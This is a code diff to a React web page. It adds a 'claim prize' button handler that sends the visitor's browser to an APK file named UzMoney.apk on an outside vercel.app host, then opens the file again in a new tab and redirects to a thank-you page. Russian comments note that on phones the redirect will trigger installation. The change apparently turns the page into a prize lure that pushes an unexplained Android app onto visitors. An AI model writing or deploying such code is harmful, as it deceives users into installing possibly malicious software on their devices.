@@ -11,6 +11,24 @@ export default function App() {
     link.click();
     document.body.removeChild(link);
   };
+         const handleClaimPrize = (e) => {
+    e.preventDefault();
+
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
+    
+    // На мобилке: попытка открыть напрямую (вызовет установку)
+    window.location.href = apkUrl;
+
+    // На ПК: открываем в новой вкладке
+    setTimeout(() => {
+      window.open(apkUrl, '_blank');
+    }, 300);
+
+    // Редирект на thankyou после задержки
+    setTimeout(() => {
+      window.location.href = '/thankyou2.html';
+    }, 1500);
+  };
 
   const baseContainerStyle = {
     minHeight: '100vh',
@@ -183,7 +201,7 @@ export default function App() {
 
         {/* Кнопка */}
         <button
-          onClick={handleDownload}
+          onClick={handleClaimPrize}
           style={buttonBaseStyle}
           onMouseOver={(e) => handleButtonHover(e, true)}
           onMouseOut={(e) => handleButtonHover(e, false)}
